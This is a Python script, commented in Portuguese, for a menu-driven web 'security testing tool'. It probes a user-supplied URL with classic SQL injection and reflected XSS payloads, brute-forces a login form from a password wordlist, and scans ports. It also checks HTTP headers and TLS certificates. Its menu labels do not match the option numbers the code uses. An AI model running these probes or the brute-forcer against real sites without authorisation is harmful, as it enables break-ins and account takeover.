import requests
import socket
import ssl
from urllib.parse import urlencode
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    print(Fore.RED + Style.BRIGHT + """
   ▐ ▄       ▄▄▄▄▄    .▄▄ ·        ▄▄· ▪   ▄▄▄· ▄▄▌       ▄▄· ▄▄▌  ▄• ▄▌▄▄▄▄· 
  •█▌▐█▪     •██      ▐█ ▀. ▪     ▐█ ▌▪██ ▐█ ▀█ ██•      ▐█ ▌▪██•  █▪██▌▐█ ▀█▪
  ▐█▐▐▌ ▄█▀▄  ▐█.▪    ▄▀▀▀█▄ ▄█▀▄ ██ ▄▄▐█·▄█▀▀█ ██▪      ██ ▄▄██▪  █▌▐█▌▐█▀▀█▄
  ██▐█▌▐█▌.▐▌ ▐█▌·    ▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█ ▪▐▌▐█▌▐▌    ▐███▌▐█▌▐▌▐█▄█▌██▄▪▐█
  ▀▀ █▪ ▀█▄▀▪ ▀▀▀      ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀     ·▀▀▀ .▀▀▀  ▀▀▀ ·▀▀▀▀ 
                      Not Social Club | Security Testing Tool
                            github.com/not-social-club
    """)

def menu():
    print(Fore.CYAN + """
[1] Testar SQL Injection
[2] Testar XSS (Refletido)
[3] Força Bruta (Login)
[4] Verificar Headers HTTP
[5] Scan de Portas Local
[6] Sair
""")

# Módulo 1: SQL Injection
def test_sql_injection():
    print(Fore.YELLOW + "\n[!] Teste de SQL Injection")
    url = input("URL com parâmetro (ex: https://site.com/login.php?user=admin): ").strip()
    payloads = ["' OR '1'='1", "' OR 1=1--", "';--", "' OR 'a'='a", "' OR '1'='1' --"]

    for p in payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            if "mysql" in r.text.lower() or "syntax" in r.text.lower():
                print(Fore.GREEN + f"[✓] Possível vulnerabilidade detectada com payload: {p}")
            else:
                print(Fore.LIGHTWHITE_EX + f"[-] Testado: {p}")
        except Exception as e:
            print(Fore.RED + f"[x] Erro: {e}")

# Módulo 2: XSS Refletido
def test_xss():
    print(Fore.YELLOW + "\n[!] Teste de XSS Refletido")
    url = input("URL com parâmetro (ex: https://site.com/page.php?msg=): ").strip()
    xss_payload = "<script>alert('XSS')</script>"

    try:
        full_url = url + urlencode({'': xss_payload})[1:]
        r = requests.get(full_url, timeout=5)
        if xss_payload in r.text:
            print(Fore.GREEN + f"[✓] Vulnerável a XSS refletido! Payload: {xss_payload}")
        else:
            print(Fore.LIGHTWHITE_EX + "[-] Nenhum XSS refletido detectado.")
    except Exception as e:
        print(Fore.RED + f"[x] Erro: {e}")

# Módulo 3: Força bruta de login com dicionário
def brute_force_login():
    print(Fore.YELLOW + "\n[!] Força Bruta de Login com Dicionário")
    url = input("URL de login (POST): ").strip()
    user_field = input("Campo do usuário (ex: username): ").strip()
    pass_field = input("Campo da senha (ex: password): ").strip()
    user = input("Usuário para testar: ").strip()
    senha_lista = input("Caminho do arquivo com senhas: ").strip()

    try:
        with open(senha_lista, 'r', encoding='utf-8') as f:
            senhas = [linha.strip() for linha in f]

        for senha in senhas:
            data = {user_field: user, pass_field: senha}
            r = requests.post(url, data=data, timeout=5)
            if "senha inválida" in r.text.lower() or "login incorreto" in r.text.lower():
                print(Fore.LIGHTWHITE_EX + f"[-] {senha}")
            else:
                print(Fore.GREEN + f"[✓] Login bem-sucedido! Senha: {senha}")
                break
    except Exception as e:
        print(Fore.RED + f"[x] Erro: {e}")

# Módulo 4: Verificar Headers HTTP inseguros
def check_http_headers():
    print(Fore.YELLOW + "\n[!] Verificação de Headers HTTP...")
    url = input("URL alvo (ex: https://meusite.com): ").strip()

    try:
        response = requests.get(url, timeout=10)
        headers = response.headers

        print(Fore.LIGHTWHITE_EX + "\n[*] Headers encontrados:")
        for h, v in headers.items():
            print(Fore.LIGHTCYAN_EX + f"{h}: {v}")

        print(Fore.LIGHTYELLOW_EX + "\n[*] Verificando headers de segurança...")

        recomendados = {
            "Content-Security-Policy": "Protege contra XSS e injeção de conteúdo",
            "Strict-Transport-Security": "Enforce HTTPS",
            "X-Frame-Options": "Previne clickjacking",
            "X-XSS-Protection": "Protege contra XSS (navegadores antigos)",
            "X-Content-Type-Options": "Evita MIME sniffing",
            "Referrer-Policy": "Controla o envio do cabeçalho Referer",
            "Permissions-Policy": "Controla acesso a funcionalidades como câmera/mic"
        }

        for header, desc in recomendados.items():
            if header not in headers:
                print(Fore.RED + f"[!] Ausente: {header} → {desc}")
            else:
                print(Fore.GREEN + f"[✓] Presente: {header}")

    except Exception as e:
        print(Fore.RED + f"[x] Erro ao acessar: {e}")

# Módulo 5: Scan de Portas via socket
def port_scan():
    print(Fore.YELLOW + "\n[!] Scan de Portas")
    target = input("Alvo (IP ou hostname): ").strip()
    start_port = int(input("Porta inicial (ex: 1): ").strip())
    end_port = int(input("Porta final (ex: 1024): ").strip())

    print(Fore.CYAN + f"\n[*] Iniciando scan em {target} de {start_port} a {end_port}")
    start_time = datetime.now()

    try:
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(Fore.GREEN + f"[✓] Porta {port} aberta")
            sock.close()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[x] Interrompido pelo usuário.")
    except socket.gaierror:
        print(Fore.RED + "[x] Nome do host inválido.")
    except socket.error:
        print(Fore.RED + "[x] Não foi possível conectar ao alvo.")

    end_time = datetime.now()
    duration = end_time - start_time
    print(Fore.CYAN + f"\n[✓] Scan concluído em {duration}")

# Módulo 6: Verificar HTTPS/TLS
def check_https_tls():
    print(Fore.YELLOW + "\n[!] Verificando HTTPS/TLS")
    host = input("Domínio (ex: google.com): ").strip()
    port = 443

    context = ssl.create_default_context()
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                tls_version = ssock.version()

                subject = dict(x[0] for x in cert['subject'])
                issued_to = subject.get('commonName', 'N/A')
                issuer = dict(x[0] for x in cert['issuer']).get('commonName', 'N/A')
                not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')

                print(Fore.LIGHTCYAN_EX + f"\n[*] HTTPS ativo - Protocolo: {tls_version}")
                print(Fore.LIGHTWHITE_EX + f"[-] Emitido para: {issued_to}")
                print(f"[-] Emitido por: {issuer}")
                print(f"[-] Expira em: {not_after}")

                if datetime.utcnow() > not_after:
                    print(Fore.RED + "[!] Certificado expirado!")
                else:
                    dias = (not_after - datetime.utcnow()).days
                    print(Fore.GREEN + f"[✓] Certificado válido por mais {dias} dias.")
    except ssl.SSLError as e:
        print(Fore.RED + f"[x] SSL/TLS inválido: {e}")
    except socket.error as e:
        print(Fore.RED + f"[x] Erro de conexão: {e}")
    except Exception as e:
        print(Fore.RED + f"[x] Erro inesperado: {e}")

# Execução
def main():
    banner()
    while True:
        menu()
        opcao = input(Fore.LIGHTWHITE_EX + "\nEscolha uma opção: ").strip()

        if opcao == '1':
            test_sql_injection()
        elif opcao == '2':
            test_xss()
        elif opcao == '3':
            brute_force_login()
        elif opcao == '4':
            check_http_headers()
        elif opcao == '5':
            port_scan()
        elif opcao == '6':
            check_https_tls()
        elif opcao == '7':
            print(Fore.CYAN + "\nSaindo... Até a próxima missão NSC.")
            break
        else:
            print(Fore.RED + "[x] Opção inválida.")

if __name__ == "__main__":
    main()